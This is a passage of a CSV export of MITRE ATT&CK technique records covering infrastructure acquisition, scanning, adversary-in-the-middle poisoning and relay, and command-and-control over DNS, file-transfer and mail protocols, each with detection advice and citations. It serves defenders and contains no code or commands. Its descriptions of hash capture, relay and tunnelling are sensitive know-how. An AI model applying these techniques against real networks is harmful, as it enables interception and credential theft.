Malvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)

Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) ",https://attack.mitre.org/techniques/T1583/008,21 February 2023,17 April 2023,enterprise-attack,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1583,,"Goldstein Menachem; Hiroki Nagahama, NEC Corporation; Juan Carlos Campuzano - Mnemo-CERT; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Tom Hegel",,,,,,","
T1583.004,attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337,Acquire Infrastructure: Server,"Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Adversaries may use web servers to support support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations. Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations.

Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",https://attack.mitre.org/techniques/T1583/004,01 October 2020,12 April 2023,enterprise-attack,1.2,Resource Development,"Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1583,,"Dor Edry, Microsoft",,,,,,"(Citation: FoxIT Wocao December 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Lazarus Jun 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: McAfee Honeybee),(Citation: Microsoft GALLIUM December 2019),(Citation: KISA Operation Muzabi),(Citation: McAfee Night Dragon),"
T1583.007,attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d,Acquire Infrastructure: Serverless,"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.

Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",https://attack.mitre.org/techniques/T1583/007,08 July 2022,20 October 2022,enterprise-attack,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1583,,Awake Security,,,,,,","
T1583.003,attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795,Acquire Infrastructure: Virtual Private Server,"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.

Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",https://attack.mitre.org/techniques/T1583/003,01 October 2020,17 October 2021,enterprise-attack,1.1,Resource Development,"Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1583,,,,,,,,"(Citation: Gigamon Berserk Bear October 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: FireEye TRITON 2019),(Citation: Microsoft HAFNIUM March 2020),(Citation: Novetta-Axiom),"
T1583.006,attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54,Acquire Infrastructure: Web Services,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",https://attack.mitre.org/techniques/T1583/006,01 October 2020,12 April 2023,enterprise-attack,1.2,Resource Development,"Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).",PRE,Internet Scan: Response Content,True,T1583,,"Dor Edry, Microsoft",,,,,,"(Citation: CISA AppleJeus Feb 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Trend Micro Muddy Water March 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Proofpoint TA2541 February 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Google Election Threats October 2020),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Microsoft POLONIUM June 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye APT17),(Citation: ESET Crutch December 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: Mandiant FIN7 Apr 2022),(Citation: MSTIC NOBELIUM May 2021),(Citation: Anomali Static Kitten February 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: HackerNews IndigoZebra July 2021),(Citation: FireEye APT29),"
T1595.001,attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120,Active Scanning: Scanning IP Blocks,"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.

Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1595/001,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Network Traffic: Network Traffic Flow,True,T1595,,,,,,,,"(Citation: Trend Micro TeamTNT),"
T1595.002,attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4,Active Scanning: Vulnerability Scanning,"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.

These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1595/002,02 October 2020,13 March 2023,enterprise-attack,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1595,,,,,,,,"(Citation: Check Point APT35 CharmPower January 2022),(Citation: TrendMicro Pawn Storm 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Trend Micro TeamTNT),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: CrowdStrike AQUATIC PANDA December 2021),"
T1595.003,attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46,Active Scanning: Wordlist Scanning,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).

For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  

As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ",https://attack.mitre.org/techniques/T1595/003,04 March 2022,15 April 2022,enterprise-attack,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Monitor for access to S3 buckets, especially those that are not intended to be publicly accessible. 

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. 

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Network Traffic: Network Traffic Content,True,T1595,,"Elvis Veliz, Citi; Jan Petrov, Citi; Richard Julian, Citi",,,,,,"(Citation: ClearSky Lebanese Cedar Jan 2021),"
T1557.002,attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213,Adversary-in-the-Middle: ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
",https://attack.mitre.org/techniques/T1557/002,15 October 2020,22 July 2022,enterprise-attack,1.1,"Collection, Credential Access","Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. 

Consider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1557,,"Jon Sternstein, Stern Security",,,,,,"(Citation: Bitdefender LuminousMoth July 2021),(Citation: Cylance Cleaver),(Citation: Juniper DAI 2020),(Citation: Cisco ARP Poisoning Mitigation 2016)"
T1557.003,attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5,Adversary-in-the-Middle: DHCP Spoofing,"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: 

1. The client broadcasts a `DISCOVER` message.

2. The server responds with an `OFFER` message, which includes an available network address. 

3. The client broadcasts a `REQUEST` message, which includes the network address offered. 

4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.

Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.

DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.

Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool. ",https://attack.mitre.org/techniques/T1557/003,24 March 2022,21 October 2022,enterprise-attack,1.1,"Collection, Credential Access","Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)","Linux, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1557,,"Alex Spivakovsky, Pentera; Andrew Allen, @whitehat_zero",,,,,,",(Citation: dhcp_serv_op_events),(Citation: ntlm_relaying_kerberos_del)"
T1557.001,attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e,Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. 

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.

In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. 

Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",https://attack.mitre.org/techniques/T1557/001,11 February 2020,25 October 2022,enterprise-attack,1.4,"Collection, Credential Access","Monitor <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient</code> for changes to the ""EnableMulticast"" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)

Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.

Deploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)",Windows,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification",True,T1557,,"Andrew Allen, @whitehat_zero; Eric Kuehn, Secure Ideas; Matthew Demaske, Adaptforward",,,,,,"(Citation: Github PowerShell Empire),(Citation: GitHub PoshC2),(Citation: GitHub Responder),(Citation: GitHub Pupy),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Impacket Tools),(Citation: GitHub Inveigh),(Citation: ADSecurity Windows Secure Baseline),(Citation: Secure Ideas SMB Relay),(Citation: Microsoft SMB Packet Signing),(Citation: byt3bl33d3r NTLM Relaying)"
T1071.004,attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72,Application Layer Protocol: DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",https://attack.mitre.org/techniques/T1071/004,15 March 2020,17 June 2022,enterprise-attack,1.1,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

Monitor for DNS traffic to/from known-bad or suspicious domains.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,"Chris Heald; Jan Petrov, Citi",,,,,,"(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Medium Anchor DNS July 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: CopyKittens Nov 2015),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: NCC Group Chimera January 2021),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 QUADAGENT July 2018),(Citation: MoustachedBouncer ESET August 2023),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: FireEye APT41 Aug 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: Kaspersky ProjectSauron Full Report),(Citation: PWC WellMess July 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Securelist Denis April 2017),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Group IB Cobalt Aug 2017),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Accenture Lyceum Targets November 2021),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: ESET Gelsemium June 2021),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit42 RDAT July 2020),(Citation: GitHub Sliver C2 DNS),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: NCSC APT29 July 2020),(Citation: ESET Ebury Feb 2014),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Talos Cobalt Group July 2018),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Palo Alto OilRig Sep 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: Zscaler Cobian Aug 2017),(Citation: SecureWorks August 2019),(Citation: Palo Alto OilRig May 2016),(Citation: FireEye APT32 May 2017),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Mythc Documentation),(Citation: fsecure NanHaiShu July 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Check Point APT34 April 2021),(Citation: FireEye APT34 July 2019),(Citation: BitDefender Chafer May 2020),(Citation: Cisco DNSMessenger March 2017),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto DNS Requests),(Citation: Lunghi Iron Tiger Linux),(Citation: ThreatStream Evasion Analysis),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Dell TG-3390),(Citation: cobaltstrike manual),(Citation: Unit42 OilRig Playbook 2023),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Symantec Remsec IOCs),(Citation: FireEye FIN7 Aug 2018),(Citation: PaloAlto DNS Requests May 2016),(Citation: Group IB APT 41 June 2021),(Citation: FireEye FiveHands April 2021),(Citation: FireEye FIN7 March 2017),"
T1071.002,attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b,Application Layer Protocol: File Transfer Protocols,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/002,15 March 2020,01 October 2023,enterprise-attack,1.1,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,,,,,,,"(Citation: Unit 42 Kazuar May 2017),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: ESET Machete July 2019),(Citation: ESET Attor Oct 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: Microsoft PLATINUM April 2016),(Citation: XAgentOSX 2017),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Talos PoetRAT October 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Kaspersky Regin),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Cylance Machete Mar 2017),(Citation: 360 Machete Sep 2020),(Citation: McAfee Honeybee),(Citation: Unit42 SilverTerrier 2018),(Citation: US-CERT TA18-074A),(Citation: Mythc Documentation),(Citation: Unit 42 CARROTBAT January 2020),(Citation: FireEye APT41 March 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: BitDefender BADHATCH Mar 2021),(Citation: cobaltstrike manual),"
T1071.003,attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b,Application Layer Protocol: Mail Protocols,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/003,15 March 2020,21 October 2020,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,,,,,,,"(Citation: Unit 42 BadPatch Oct 2017),(Citation: MoustachedBouncer ESET August 2023),(Citation: Microsoft PLATINUM April 2016),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: Kaspersky ProjectSauron Full Report),(Citation: ESET Zebrocy May 2019),(Citation: FireEye APT28),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Unit42 RDAT July 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Palo Alto Sofacy 06-2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Unit42 Sofacy Dec 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: Microsoft SIR Vol 19),(Citation: CISA AA20-301A Kimsuky),(Citation: ESET Sednit Part 2),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 SilverTerrier 2018),(Citation: Talos NavRAT May 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET ComRAT May 2020),(Citation: Fortinet Agent Tesla June 2017),(Citation: Symantec Remsec IOCs),(Citation: ESET Zebrocy Nov 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ESET LightNeuron May 2019),(Citation: DigiTrust Agent Tesla Jan 2017),"
T1071.001,attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161,Application Layer Protocol: Web Protocols,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

